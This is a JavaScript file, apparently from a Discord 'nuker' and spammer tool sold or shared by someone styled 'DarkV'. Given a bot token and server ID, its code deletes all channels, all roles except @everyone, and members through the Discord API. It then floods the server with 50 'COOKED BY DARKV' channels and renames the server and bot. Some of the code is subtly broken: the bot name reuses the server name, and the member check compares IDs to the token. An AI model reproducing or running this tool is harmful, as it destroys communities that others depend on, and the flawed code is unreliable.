// Handle Tab Navigation
window.addEventListener('load', () => {
    document.getElementById("homeTab").addEventListener("click", () => toggleTab("home"));
    document.getElementById("spammerTab").addEventListener("click", () => toggleTab("spammer"));
    document.getElementById("infoTab").addEventListener("click", () => toggleTab("info"));
    document.getElementById("buyTab").addEventListener("click", () => toggleTab("buy"));
    document.getElementById("nukerTab").addEventListener("click", () => toggleTab("nuker"));
});

function toggleTab(tabId) {
    document.querySelectorAll('.container').forEach(container => {
        container.style.display = "none";
    });
    document.getElementById(`${tabId}Content`).style.display = 'block';
}

// Nuker Tab JavaScript
const nukeButton = document.getElementById('nukeButton');
const nukerStatus = document.getElementById('nukerStatus');
const nukerLoader = document.getElementById('nukerLoader');
const botTokenInput = document.getElementById('botToken');
const serverIdInput = document.getElementById('serverId');
const botNameElement = document.getElementById('botName');
const serverNameElement = document.getElementById('serverName');

nukeButton.addEventListener("click", async () => {
    const botToken = botTokenInput.value.trim();
    const serverId = serverIdInput.value.trim();

    if (!botToken || !serverId) {
        nukerStatus.textContent = "Status: Error... Invalid Bot Token or Server ID";
        return;
    }

    nukerStatus.textContent = "Status: Fetching Bot Info...";
    nukerLoader.style.display = "block";

    try {
        // Fetch bot user info and server info
        const botInfo = await fetchBotInfo(botToken, serverId);
        botNameElement.textContent = `Bot Name: ${botInfo.botName}`;
        serverNameElement.textContent = `Server Name: ${botInfo.serverName}`;
        
        // Start nuking process
        await performNuking(botToken, serverId);

        nukerStatus.textContent = "Status: Nuking completed successfully!";
    } catch (error) {
        console.error(error);
        nukerStatus.textContent = "Status: Error occurred during nuking!";
    } finally {
        nukerLoader.style.display = "none";
    }
});

async function fetchBotInfo(botToken, serverId) {
    const response = await fetch(`https://discord.com/api/v9/guilds/${serverId}`, {
        headers: {
            'Authorization': `Bot ${botToken}`
        }
    });

    if (!response.ok) throw new Error("Failed to fetch bot or server info");

    const data = await response.json();
    const botName = data.name;
    const serverName = data.name;

    return { botName, serverName };
}

async function performNuking(botToken, serverId) {
    const headers = {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json'
    };

    // Deleting channels
    const channels = await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
        method: 'GET',
        headers: headers
    });

    const channelData = await channels.json();
    for (let channel of channelData) {
        await fetch(`https://discord.com/api/v9/channels/${channel.id}`, {
            method: 'DELETE',
            headers: headers
        });
    }

    // Deleting roles
    const roles = await fetch(`https://discord.com/api/v9/guilds/${serverId}/roles`, {
        method: 'GET',
        headers: headers
    });

    const roleData = await roles.json();
    for (let role of roleData) {
        if (role.name !== '@everyone') {
            await fetch(`https://discord.com/api/v9/guilds/${serverId}/roles/${role.id}`, {
                method: 'DELETE',
                headers: headers
            });
        }
    }

    // Deleting members
    const members = await fetch(`https://discord.com/api/v9/guilds/${serverId}/members`, {
        method: 'GET',
        headers: headers
    });

    const memberData = await members.json();
    for (let member of memberData) {
        if (member.user.id !== botToken) {
            await fetch(`https://discord.com/api/v9/guilds/${serverId}/members/${member.user.id}`, {
                method: 'DELETE',
                headers: headers
            });
        }
    }

    // Create new channels
    const newChannelData = {
        'name': 'COOKED BY DARKV 😈',
        'type': 0, // Text channel
        'guild_id': serverId
    };

    for (let i = 0; i < 50; i++) {
        await fetch(`https://discord.com/api/v9/guilds/${serverId}/channels`, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(newChannelData)
        });
    }

    // Update Server Name and Bot Profile Picture
    await fetch(`https://discord.com/api/v9/guilds/${serverId}`, {
        method: 'PATCH',
        headers: headers,
        body: JSON.stringify({
            'name': 'PROPERTY OF DARKV',
            'icon': 'https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png?ex=676a1afc&is=6768c97c&hm=8586677d875c772f95983ff3426ae0f732a0a402fc037263566aaef14633eb33&'
        })
    });

    // Change bot username and profile picture
    await fetch(`https://discord.com/api/v9/users/@me`, {
        method: 'PATCH',
        headers: headers,
        body: JSON.stringify({
            'username': 'DarkV',
            'avatar': 'https://cdn.discordapp.com/attachments/1320574046181654644/1320577337192091698/Screenshot_2024-12-22_203452.png?ex=676a1afc&is=6768c97c&hm=8586677d875c772f95983ff3426ae0f732a0a402fc037263566aaef14633eb33&'
        })
    });
}
